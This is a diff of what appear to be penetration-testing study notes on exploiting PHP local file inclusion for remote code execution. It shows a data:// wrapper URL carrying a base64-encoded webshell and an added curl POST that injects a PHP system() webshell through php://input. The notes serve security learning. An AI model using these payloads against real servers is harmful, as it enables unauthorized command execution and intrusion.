@@ -104,6 +104,12 @@ Then, we pass the encoded string into the data wrapper with text.plain;base64, a
 http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 ```
 
-Using Input Wrapper:
+Using Input Wrapper for RCE:
 
-similar to data wrapper, we can use input wrapper to archive RCE, notice that input wrapper 
+similar to data wrapper, we can use input wrapper to archive RCE, notice that input wrapper operate based on POST Request, so the vulnerable parameter must also accept POST requests for such attacks to work, to perform this attack, we directly include the webshell in our post request and pass in our command parameter in 
+
+```
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
+```
+
+Using 
